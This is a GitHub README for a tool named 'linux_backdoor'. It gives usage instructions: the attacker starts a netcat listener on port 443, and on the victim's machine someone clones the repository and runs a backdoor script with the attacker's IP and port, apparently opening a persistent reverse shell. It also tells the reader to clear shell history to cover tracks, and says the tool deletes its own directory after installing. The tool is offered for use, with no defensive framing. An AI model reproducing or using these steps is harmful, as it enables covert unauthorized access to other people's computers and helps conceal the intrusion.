# linux_backdoor

![toy-train-removebg-preview](https://user-images.githubusercontent.com/115974774/203227151-e199c991-b586-49ca-9dec-8fabd897b842.png)


Usage : 

  ~ Attacker's PC ~
   
   $ nc -lvnp 443
   
  ~ Victim's PC ~

  $ git clone https://github.com/KingstonCyberSec/linux_backdoor.git
  
  $ cd linux_backdoor
  
  $ chmod +x *
  
  $ bash backdoor.sh (Attacker IP) (Port)
  
Images :

![github](https://user-images.githubusercontent.com/115974774/201770400-185f3e45-665a-45e7-95a3-1ed8ebc3614f.png)


  Clearing Tracks :
  
   ~ Victim's PC ~
  
  $ history -c

  
  Note :

=================================================================================================================
|  You have to keep netcat listner(nc -lvnp 443) started whenever the victim's PC is on so you will get access  |
=================================================================================================================
  
===================================================================================================================  
|  Once the backdoor is injected, it will automatically delete the linux_backdoor directory from the victim's PC. |
===================================================================================================================
